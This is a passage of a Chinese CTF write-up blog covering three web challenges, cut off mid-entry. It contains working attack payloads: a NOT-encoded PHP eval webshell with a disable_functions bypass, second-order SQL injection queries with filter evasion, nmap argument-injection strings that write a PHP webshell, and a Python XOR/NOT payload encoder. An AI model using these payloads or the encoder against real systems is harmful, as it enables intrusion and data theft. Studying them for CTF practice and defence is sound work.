        <content type="html"><![CDATA[<h1 id="极客大挑战2019-RCE-ME"><a href="#极客大挑战2019-RCE-ME" class="headerlink" title="极客大挑战2019-RCE-ME"></a>极客大挑战2019-RCE-ME</h1><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;<br>            <span class="hljs-variable">$code</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>];<br>                    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$code</span>)&gt;<span class="hljs-number">40</span>)&#123;<br>                                        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;This is too Long.&quot;</span>);<br>                                                &#125;<br>                    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="hljs-variable">$code</span>))&#123;<br>                                        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NO.&quot;</span>);<br>                                                &#125;<br>                    @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><span class="hljs-comment">// ?&gt;</span><br></code></pre></td></tr></table></figure><p>很明显要我们利用危险函数eval进行命令执行来得到flag，并且这里还过滤掉了数字和字母，且我们GET传参的值要小于40个字符。</p><p>我们这里使用取反绕过<br>构造命令<code>assert(eval($_POST[1]););</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><br><span class="hljs-variable">$system</span>=<span class="hljs-string">&quot;assert&quot;</span>;<br><span class="hljs-variable">$command</span>=<span class="hljs-string">&#x27;eval($_POST[1]);&#x27;</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;[*] (~&#x27;</span>.<span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$system</span>).<span class="hljs-string">&#x27;)(~&#x27;</span>.<span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$command</span>).<span class="hljs-string">&#x27;);&#x27;</span>;<br><br></code></pre></td></tr></table></figure><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">[*] (~<span class="hljs-variable">%9</span>E<span class="hljs-variable">%8</span>C<span class="hljs-variable">%8</span>C<span class="hljs-variable">%9</span>A<span class="hljs-variable">%8</span>D<span class="hljs-variable">%8</span>B)(~<span class="hljs-variable">%9</span>A<span class="hljs-variable">%89</span><span class="hljs-variable">%9</span>E<span class="hljs-variable">%93</span><span class="hljs-variable">%D7</span><span class="hljs-variable">%DB</span><span class="hljs-variable">%A0</span><span class="hljs-variable">%AF</span><span class="hljs-variable">%B0</span><span class="hljs-variable">%AC</span><span class="hljs-variable">%AB</span><span class="hljs-variable">%A4</span><span class="hljs-variable">%CE</span><span class="hljs-variable">%A2</span><span class="hljs-variable">%D6</span><span class="hljs-variable">%C4</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>payload：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">url/?code<span class="hljs-operator">=</span>(~<span class="hljs-variable">%9</span>E<span class="hljs-variable">%8</span>C<span class="hljs-variable">%8</span>C<span class="hljs-variable">%9</span>A<span class="hljs-variable">%8</span>D<span class="hljs-variable">%8</span>B)(~<span class="hljs-variable">%9</span>A<span class="hljs-variable">%89</span><span class="hljs-variable">%9</span>E<span class="hljs-variable">%93</span><span class="hljs-variable">%D7</span><span class="hljs-variable">%DB</span><span class="hljs-variable">%A0</span><span class="hljs-variable">%AF</span><span class="hljs-variable">%B0</span><span class="hljs-variable">%AC</span><span class="hljs-variable">%AB</span><span class="hljs-variable">%A4</span><span class="hljs-variable">%CE</span><span class="hljs-variable">%A2</span><span class="hljs-variable">%D6</span><span class="hljs-variable">%C4</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>然后用蚁剑连接，成功连接</p><p>发现一个flag文件和readflag文件，但是flag文件内什么都没有，readflag文件直接打开全是乱码</p><p>并且无法执行命令</p><p>这个时候访问下phpinfo()查看下配置就会发现，在disable_function内禁用了很大部分函数，在终端也因此执行不了操作。</p><hr><p>这时我们可以使用蚁剑提供了可以用来绕过的插件(XD)disable_function</p><p><img src="/../image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-RCE-ME-1.png"></p><p>模式选择php7_GC_UAF</p><p>然后在shell里执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/readflag<br></code></pre></td></tr></table></figure><p>得到flag</p><p><img src="/../image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-RCE-ME-2.png"></p><hr><h2 id="异或取反脚本"><a href="#异或取反脚本" class="headerlink" title="异或取反脚本"></a>异或取反脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#blacklist列表中的字符在生成的拼接字符串中不会被使用,除了部分是被过滤掉的字符，其余的如&#x27;,&quot;等字符考虑可能会导致闭合等问题暂列入</span><br><span class="hljs-comment">#如果有其他的要求可以对blacklist列表进行删改</span><br>blacklist=[<span class="hljs-string">&quot;`&quot;</span>,<span class="hljs-string">&quot;&#x27;&quot;</span>,<span class="hljs-string">&#x27;&quot;&#x27;</span>,<span class="hljs-string">&quot;\\&quot;</span><span class="hljs-string">&quot;0&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-string">&quot;2&quot;</span>,<span class="hljs-string">&quot;3&quot;</span>,<span class="hljs-string">&quot;4&quot;</span>,<span class="hljs-string">&quot;5&quot;</span>,<span class="hljs-string">&quot;6&quot;</span>,<span class="hljs-string">&quot;7&quot;</span>,<span class="hljs-string">&quot;8&quot;</span>,<span class="hljs-string">&quot;9&quot;</span>,<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;b&quot;</span>,<span class="hljs-string">&quot;c&quot;</span>,<span class="hljs-string">&quot;d&quot;</span>,<span class="hljs-string">&quot;e&quot;</span>,<span class="hljs-string">&quot;f&quot;</span>,<span class="hljs-string">&quot;g&quot;</span>,<span class="hljs-string">&quot;h&quot;</span>,<span class="hljs-string">&quot;i&quot;</span>,<span class="hljs-string">&quot;j&quot;</span>,<span class="hljs-string">&quot;k&quot;</span>,<span class="hljs-string">&quot;l&quot;</span>,<span class="hljs-string">&quot;m&quot;</span>,<span class="hljs-string">&quot;n&quot;</span>,<span class="hljs-string">&quot;o&quot;</span>,<span class="hljs-string">&quot;p&quot;</span>,<span class="hljs-string">&quot;q&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>,<span class="hljs-string">&quot;s&quot;</span>,<span class="hljs-string">&quot;t&quot;</span>,<span class="hljs-string">&quot;u&quot;</span>,<span class="hljs-string">&quot;v&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>,<span class="hljs-string">&quot;x&quot;</span>,<span class="hljs-string">&quot;y&quot;</span>,<span class="hljs-string">&quot;z&quot;</span>,<span class="hljs-string">&quot;A&quot;</span>,<span class="hljs-string">&quot;B&quot;</span>,<span class="hljs-string">&quot;C&quot;</span>,<span class="hljs-string">&quot;D&quot;</span>,<span class="hljs-string">&quot;E&quot;</span>,<span class="hljs-string">&quot;F&quot;</span>,<span class="hljs-string">&quot;G&quot;</span>,<span class="hljs-string">&quot;H&quot;</span>,<span class="hljs-string">&quot;I&quot;</span>,<span class="hljs-string">&quot;J&quot;</span>,<span class="hljs-string">&quot;K&quot;</span>,<span class="hljs-string">&quot;L&quot;</span>,<span class="hljs-string">&quot;M&quot;</span>,<span class="hljs-string">&quot;N&quot;</span>,<span class="hljs-string">&quot;O&quot;</span>,<span class="hljs-string">&quot;P&quot;</span>,<span class="hljs-string">&quot;Q&quot;</span>,<span class="hljs-string">&quot;R&quot;</span>,<span class="hljs-string">&quot;S&quot;</span>,<span class="hljs-string">&quot;T&quot;</span>,<span class="hljs-string">&quot;U&quot;</span>,<span class="hljs-string">&quot;V&quot;</span>,<span class="hljs-string">&quot;W&quot;</span>,<span class="hljs-string">&quot;X&quot;</span>,<span class="hljs-string">&quot;Y&quot;</span>,<span class="hljs-string">&quot;Z&quot;</span>]<br><span class="hljs-comment">#不同于取反,一个目标字符串使用异或的方式可以获大量的可用拼接字符串,这里只取了1种组合的拼接字符串</span><br><span class="hljs-comment">#如果需要获得更多拼接字符串查看该函数中的result列表</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">yiHuo</span>(<span class="hljs-params">string</span>):<br>    <span class="hljs-keyword">global</span> operationEffient<br>    <span class="hljs-keyword">global</span> blacklist<br>    operationEffient=<span class="hljs-literal">False</span><br>    result=[]<br>    finalstr=<span class="hljs-string">&#x27;&quot;&quot;^&quot;&quot;&#x27;</span><br>    rawstr=string<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(rawstr)):<br>        result.extend([[]])<br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(rawstr)):<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">255</span>):<br>           <span class="hljs-keyword">if</span>(<span class="hljs-built_in">chr</span>(i) <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> blacklist):<br>                <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">255</span>):<br>                    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">chr</span>(j) <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> blacklist):<br>                        <span class="hljs-keyword">if</span>(i^j==<span class="hljs-built_in">ord</span>(rawstr[k])):<br>                            result[k].extend([[<span class="hljs-built_in">hex</span>(i).replace(<span class="hljs-string">&#x27;0x&#x27;</span>,<span class="hljs-string">&quot;%&quot;</span>),<span class="hljs-built_in">hex</span>(j).replace(<span class="hljs-string">&#x27;0x&#x27;</span>,<span class="hljs-string">&quot;%&quot;</span>)]])<br>    <span class="hljs-comment">#在这里往下的函数部分,result列表均是可用的(已填充了获得的拼接字符串)</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(result)):<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">len</span>(result[i])==<span class="hljs-number">0</span>):<br>            <span class="hljs-keyword">return</span>(<span class="hljs-string">&quot;该字符在现有黑名单下无法拼接出-&gt;%s&quot;</span>%(rawstr[i]))<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(rawstr)):<br>        finalstr=finalstr[:finalstr.find(<span class="hljs-string">&quot;^&quot;</span>,<span class="hljs-number">0</span>)-<span class="hljs-number">1</span>]+result[i][<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]+<span class="hljs-string">&#x27;&quot;&#x27;</span>+finalstr[finalstr.find(<span class="hljs-string">&quot;^&quot;</span>,<span class="hljs-number">0</span>):]<br>        finalstr=finalstr[:finalstr.rfind(<span class="hljs-string">&quot;&#x27;&quot;</span>,<span class="hljs-number">0</span>)]+result[i][<span class="hljs-number">0</span>][<span class="hljs-number">1</span>]+finalstr[finalstr.rfind(<span class="hljs-string">&#x27;&quot;&#x27;</span>,<span class="hljs-number">0</span>):]   <br>    <span class="hljs-keyword">return</span>(finalstr)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">quFan</span>(<span class="hljs-params">string</span>):<br>    <span class="hljs-keyword">global</span> operationEffient<br>    <span class="hljs-keyword">global</span> blacklist<br>    operationEffient=<span class="hljs-literal">False</span><br>    result=[]<br>    finalstr=<span class="hljs-string">&#x27;~&quot;&quot;&#x27;</span><br>    rawstr=string<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(rawstr)):<br>        result.extend([[]])<br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(rawstr)):<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">255</span>):<br>           <span class="hljs-keyword">if</span>(<span class="hljs-built_in">chr</span>(i) <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> blacklist <span class="hljs-keyword">and</span> <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">bin</span>(~i &amp; <span class="hljs-number">0xFF</span>)[<span class="hljs-number">2</span>:],<span class="hljs-number">2</span>))==rawstr[k]):<br>               result[k].extend([<span class="hljs-built_in">hex</span>(i).replace(<span class="hljs-string">&#x27;0x&#x27;</span>,<span class="hljs-string">&quot;%&quot;</span>)])<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(result)):<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">len</span>(result[i])==<span class="hljs-number">0</span>):<br>            <span class="hljs-keyword">return</span>(<span class="hljs-string">&quot;该字符在现有黑名单下无法拼接出-&gt;%s&quot;</span>%(rawstr[i]))<br>    <span class="hljs-built_in">print</span>(result)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(rawstr)):<br>        finalstr=finalstr[:finalstr.rfind(<span class="hljs-string">&#x27;&quot;&#x27;</span>,<span class="hljs-number">0</span>)]+result[i][<span class="hljs-number">0</span>]+finalstr[finalstr.rfind(<span class="hljs-string">&#x27;&quot;&#x27;</span>,<span class="hljs-number">0</span>):]<br>    <span class="hljs-keyword">return</span>(finalstr)<br><span class="hljs-keyword">while</span>(<span class="hljs-literal">True</span>):<br>    operationEffient=<span class="hljs-literal">True</span><br>    target=<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入待转换字符\n&quot;</span>)<br>    <span class="hljs-keyword">while</span>(operationEffient):<br>        operation=<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请选择操作\n1-&gt;使用异或拼接\n2-&gt;使用取反获得\n&quot;</span>)<br>        <span class="hljs-keyword">if</span>(operation==<span class="hljs-string">&quot;1&quot;</span>):<br>            result=yiHuo(target)<br>            <span class="hljs-keyword">pass</span><br>        <span class="hljs-keyword">elif</span>(operation==<span class="hljs-string">&quot;2&quot;</span>):<br>            result=quFan(target)<br>            <span class="hljs-keyword">pass</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;选择的操作无效&quot;</span>)<br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 刷题笔记 </tag>
            
            <tag> 无字母数字RCE </tag>
            
            <tag> 异或绕过 </tag>
            
            <tag> 取反绕过 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SWPU2019-Web1</title>
      <link href="/2025/03/29/SWPU2019-Web1/"/>
      <url>/2025/03/29/SWPU2019-Web1/</url>
      
        <content type="html"><![CDATA[<h1 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="SWPU2019-Web1"></a>SWPU2019-Web1</h1><p> 既然这道题是个二次注入的题目，那么就应该考虑，使用sql注入的方式了。首先构造语句，判断注入类型以及想办法清楚到底过滤了那些关键字，首先构造sql语句，之后申请，然后广告详情：</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs matlab"><span class="hljs-number">1</span>&#x27;<br></code></pre></td></tr></table></figure><p>得到了</p><pre><code>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ‘‘1’’ limit 0,1’ at line 1</code></pre><p>判断这里存在二次注入，测试过滤</p><pre><code>or , # , 空格 , order by ，information_schema</code></pre><p> 对于空格而言，则可以使用&#x2F;**&#x2F;来绕过，order by则可以使用group by ，#则可以使用,’3来闭合后面的引号来绕过，另外，information_schema 则可以使用最开始说到的无列名注入的相关的知识了，通过InnoDb引擎查表名，第一个payload为：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">group</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">by</span><span class="hljs-comment">/**/</span><span class="hljs-number">22</span>,<span class="hljs-string">&#x27;3</span><br></code></pre></td></tr></table></figure><p> 首先，构造的group by后面的整数位22的时候，没有出现错误，但是，当整数为23的时候，却出现了报错：</p><p>在这里插入图片描述</p><p> 大致可以推测出，字段总的有22个。</p><p> 那么，知道了总的有多少个字段之后，就可以试着获得数据库名和表名了，构造的payload分别为：</p><p> 首先通过构造如下payload获取回显点，最后发现，回显点是2，3</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">-<span class="hljs-number">1</span>&#x27;/**/union/**/select/**/<span class="hljs-number">1,2,3,4</span>,<span class="hljs-number">5,6,7,8</span>,<span class="hljs-number">9,10,11,12</span>,<span class="hljs-number">13,14,15,16</span>,<span class="hljs-number">17,18,19,20</span>,<span class="hljs-number">21</span>,&#x27;<span class="hljs-number">22</span><br></code></pre></td></tr></table></figure><p> 获得数据库名，成功拿到数据库为web1：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27;/**/union/**/select/**/<span class="hljs-number">1</span>,database(),<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span>,<span class="hljs-number">18</span>,<span class="hljs-number">19</span>,<span class="hljs-number">20</span>,<span class="hljs-number">21</span>,<span class="hljs-number">22</span>/**/&#x27; <br></code></pre></td></tr></table></figure><p> 获得表名：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27;/**/union/**/select/**/<span class="hljs-number">1</span>,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats),<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span>,<span class="hljs-number">18</span>,<span class="hljs-number">19</span>,<span class="hljs-number">20</span>,<span class="hljs-number">21</span>,<span class="hljs-number">22</span>/**/&#x27;<br></code></pre></td></tr></table></figure><p> 最后确定，web1这个数据库中存在的表为如下：</p><p> 根据dalao们的wp，他们使用的都是users这个表，因此，这里就不用一个表一个表地查了，直接users这个表梭哈：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27;/**/union/**/select/**/<span class="hljs-number">1</span>,(select/**/group_concat(b)/**/from/**/(select/**/<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>/**/as/**/b/**/union/**/select/**/*/**/from/**/users)a),<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span>,<span class="hljs-number">18</span>,<span class="hljs-number">19</span>,<span class="hljs-number">20</span>,<span class="hljs-number">21</span>,<span class="hljs-number">22</span>/**/&#x27;<br></code></pre></td></tr></table></figure><p> 该payload是利用了上面说到的无列名地union方法进行的，当然，为啥确定users表中存在3个字段呢？因为经过试错，发现一个字段，两个字段以及四个以上的时候，均是报错，所以，可以利用这一点，进行查询，然后通过</p><p> 然后通过修改as b 所在的地方，比如1的后方或者2的后方对列进行查找，最后发现在第三列查到了flag：</p>]]></content>
      
      
      
        <tags>
            
            <tag> 刷题笔记 </tag>
            
            <tag> sql注入 </tag>
            
            <tag> 无列名注入 </tag>
            
            <tag> 二次注入 </tag>
            
            <tag> MariaDB数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网鼎杯2020朱雀组-Nmap</title>
      <link href="/2025/03/28/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E6%9C%B1%E9%9B%80%E7%BB%84-Nmap/"/>
      <url>/2025/03/28/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E6%9C%B1%E9%9B%80%E7%BB%84-Nmap/</url>
      
        <content type="html"><![CDATA[<h1 id="网鼎杯2020朱雀组-Nmap"><a href="#网鼎杯2020朱雀组-Nmap" class="headerlink" title="网鼎杯2020朱雀组-Nmap"></a>网鼎杯2020朱雀组-Nmap</h1><p>两种解题方法：</p><p>第一种通过nmap的-iL参数读取扫描一个文件到指定文件中第二种是利用nmap的参数写入webshell</p><p>-oN 标准保存<br>-oX <a href="https://so.csdn.net/so/search?q=XML&spm=1001.2101.3001.7020">XML</a>保存<br>-oG <a href="https://so.csdn.net/so/search?q=Grep&spm=1001.2101.3001.7020">Grep</a>保存<br>-oA 保存到所有格式</p><hr><p>首先查看网页源代码，提示我们flag的存放位置在&#x2F;flag</p><p>进入页面是一个NMAP工具的使用页面</p><hr><p>先测试一下多条命令执行</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span> ; ls<br><br>发现变成了<br><span class="hljs-number">127.0.0.1</span> \; ls<br></code></pre></td></tr></table></figure><p>;被转义了</p><p>那么我们可以通过以下知识点写入webshell，或将flag读入指定文件在读取指定文件内容即可</p><h2 id="第一种解法-将flag写到指定文件"><a href="#第一种解法-将flag写到指定文件" class="headerlink" title="第一种解法 将flag写到指定文件"></a>第一种解法 将flag写到指定文件</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">127.0.0.1<span class="hljs-string">&#x27; -iL /flag -o haha</span><br><span class="hljs-string">经过escapeshellarg函数后</span><br><span class="hljs-string">&#x27;</span>127.0.0.1<span class="hljs-string">&#x27;\&#x27;</span><span class="hljs-string">&#x27; -iL /flag -o haha&#x27;</span>（将单引号转义并用一对单引号包裹起来，再将这个语句用单引号包裹起来确保只有一个参数）<br>经过escapeshellcmd函数后<br><span class="hljs-string">&#x27;127.0.0.1&#x27;</span>\\&#x27;<span class="hljs-string">&#x27; -iL /flag -o haha\&#x27;</span><br>对\转义，在许多编程语言中，反斜杠被用作转义字符，用来表示特殊字符或序列。这里面两个相邻的反斜杠\表示一个单独的反斜杠字符，没有转义作用。而末尾单引号转义过后的普通字符仍然是它本身，没有变化，会被视为普通字符不具有单引号的作用了<br>这样就分为了三部分<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>和<span class="hljs-string">&#x27;&#x27;</span>连接空白和-iL /flag -o haha<span class="hljs-string">&#x27;(最后这个单引号只有一个不起作用，但它将最后的文件名变为了haha&#x27;</span>)<br>nmap既可扫描前面的ip，又能执行-iL /flag -o haha<span class="hljs-string">&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string">ip中输入，因为&#x27;</span>127.0.0.1<span class="hljs-string">&#x27;\\执行的时候会被简化为127.0.0.1\，这个ip就错了，但是不用管报错，只要后面命令执行了我们就能访问到</span><br></code></pre></td></tr></table></figure><p>文件名变成了haha’，直接访问即可拿到flag</p><h2 id="第二种解法-利用nmap参数-oG写一句话木马"><a href="#第二种解法-利用nmap参数-oG写一句话木马" class="headerlink" title="第二种解法 利用nmap参数-oG写一句话木马"></a>第二种解法 利用nmap参数-oG写一句话木马</h2><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span> | &lt;?=@eval($_POST<span class="hljs-string">[1]</span>);&gt; -oG shell.php<br><br>发现被过滤了<br>换成phtml试试<br><span class="hljs-number">127.0.0.1</span> | &lt;?=@eval($_POST<span class="hljs-string">[1]</span>);&gt; -oG shell.phtml<br><br>构造payload：<br><span class="hljs-number">127.0.0.1</span> | &#x27; &lt;?=@eval($_POST<span class="hljs-string">[&quot;cmd&quot;]</span>);?&gt; -oG shell.phtml &#x27;<br><br><span class="hljs-number">127.0.0.1</span> | &#x27;&lt;?=@eval($_REQUEST<span class="hljs-string">[&#x27;cmd&#x27;]</span>);?&gt;&#x27; -oG attack.phtml<br></code></pre></td></tr></table></figure><p>成功</p><hr><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><p><strong>常用参数</strong></p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">nmap -iL <span class="hljs-tag">&lt;<span class="hljs-name">目标文件</span>&gt;</span>`：从文件中读取IP地址列表进行扫描</span><br><span class="language-xml"></span><br><span class="language-xml">nmap 